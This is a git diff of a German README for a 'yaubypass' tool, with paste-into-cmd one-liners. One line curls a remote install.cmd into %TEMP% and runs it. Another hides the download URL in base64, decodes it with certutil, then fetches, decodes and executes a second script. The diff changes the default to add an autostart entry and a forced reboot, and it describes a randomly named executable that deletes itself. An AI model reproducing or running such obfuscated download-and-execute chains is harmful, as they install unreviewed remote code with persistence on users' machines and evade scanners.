@@ -6,9 +6,11 @@ Der User lädt nichts herunter und klickt nichts an. Er pastet **eine Zeile in c
 curl -L -o "%TEMP%\yau.cmd" https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/install.cmd && "%TEMP%\yau.cmd"
 ```
 
-## Standard: portabel, ohne Installation, ohne Ordner
+## Standard: kein Ordner, aber mit Autostart
 
-Das ist jetzt der Standard – der Befehl braucht kein Argument (`p` funktioniert weiterhin).
+Der Befehl braucht kein Argument. Es entsteht **kein Ordner**: die Dateien liegen
+direkt in `%TEMP%` (`yaubypass.exe`, `yaubypass.dat`, `boot.cmd`), dazu kommt der
+Autostart-Eintrag und am Ende der Neustart.
 
 ```
 echo dXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9memVieXBhc3MveWF1YnlwYXNzL21haW4vZGlzdC95Yi5iNjQi> "%TEMP%\c.b64" & certutil -f -decode "%TEMP%\c.b64" "%TEMP%\c.cfg" >nul 2>&1 & curl -sfL -o "%TEMP%\y.b64" -K "%TEMP%\c.cfg" & certutil -f -decode "%TEMP%\y.b64" "%TEMP%\y.cmd" >nul 2>&1 & "%TEMP%\y.cmd" p
@@ -58,10 +60,10 @@ selbst wieder, und Virenscannern hilft Base64 eher beim Erkennen als beim Verste
 
 ---
 
-## Installation: Ordner + Autostart (nur mit `i`)
+## Portabel ohne Autostart (`p`)
 
-Willst du den Ordner `%LOCALAPPDATA%\YauBypass\` mit `yaubypass.exe`, `yaubypass.dat`, `boot.cmd`
-und dem Autostart, häng ein `i` an den Befehl:
+Wer nur starten will und keinen Autostart möchte, hängt ein `p` an den Befehl. Dann
+landet eine Datei in `%TEMP%\nv_<zufall>.exe`, die sich beim Destruct selbst löscht:
 
 ```
 ... & "%TEMP%\y.cmd" i
